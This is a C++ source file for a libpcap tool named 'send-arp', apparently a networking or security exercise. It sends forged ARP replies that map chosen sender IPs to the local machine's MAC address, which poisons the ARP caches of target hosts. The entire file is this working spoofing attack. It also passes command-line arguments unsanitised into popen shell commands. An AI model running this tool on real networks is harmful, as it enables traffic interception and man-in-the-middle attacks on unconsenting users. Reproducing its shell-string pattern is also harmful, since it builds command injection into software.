#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include<string>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

std::string getMyIpAddress(std::string interface) {
    std::string cmd = "ifconfig " + interface + " | grep 'inet ' | awk '{print $2}'";
    char buffer[128];
    std::string result;
    FILE* pipe = popen(cmd.c_str(), "r");
    if (!pipe) std::__throw_runtime_error("popen_failed!");
    while (fgets(buffer , 128, pipe) != nullptr) {
        result += buffer;
    }
    pclose(pipe);

    if (!result.empty() && result.back() == '\n')
        result.pop_back();

    return result;
}

std::string findMyMacAddress(std::string interface) {
    std::string cmd = "ifconfig " + interface + " | grep 'ether ' | awk '{print $2}'";
    char buffer[128];
    std::string result;
    FILE* pipe = popen(cmd.c_str(), "r");
    if (!pipe) std::__throw_runtime_error("popen_failed!");
    while (fgets(buffer , 128, pipe) != nullptr) {
        result += buffer;
    }
    pclose(pipe);

    if (!result.empty() && result.back() == '\n')
        result.pop_back();

    return result;
}

std::string findMacAddress(std::string Ip) {
    std::string cmd = "arp -an " + Ip + " | grep -oE '[0-9a-fA-F]{2}(:[0-9a-fA-F]{2}){5}'";
    char buffer[128];
    std::string result;
    FILE* pipe = popen(cmd.c_str(), "r");
    if (!pipe) std::__throw_runtime_error("popen_failed!");
    while (fgets(buffer , 128, pipe) != nullptr) {
        result += buffer;
    }
    pclose(pipe);

    if (!result.empty() && result.back() == '\n')
        result.pop_back();

    return result;
}

int main(int argc, char* argv[]) {
    if (argc % 2 != 0 || argc < 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    std::string senderIpCollect[(argc - 2) / 2];
    std::string targetIpCollect[(argc - 2) / 2];


    for (int i = 2; i < argc; i++) {
        if (i % 2 == 0) senderIpCollect[i / 2 - 1] = argv[i];
        else targetIpCollect[i / 2 - 1] = argv[i];
    }

    std::string myIpAddress = getMyIpAddress(argv[1]);
    std::string myMacAddress = findMyMacAddress(argv[1]);

    for (int i = 0; i < argc / 2 - 1; i++) {
        std::string targetMacAddress = findMacAddress(targetIpCollect[i]);

        EthArpPacket packet;

        packet.eth_.dmac_ = Mac(targetMacAddress);
        packet.eth_.smac_ = Mac(myMacAddress);
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Reply);
        packet.arp_.smac_ = Mac(myMacAddress);
        packet.arp_.sip_ = htonl(Ip(senderIpCollect[i]));
        packet.arp_.tmac_ = Mac(targetMacAddress);
        packet.arp_.tip_ = htonl(Ip(targetIpCollect[i]));

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
    }

	pcap_close(handle);
}
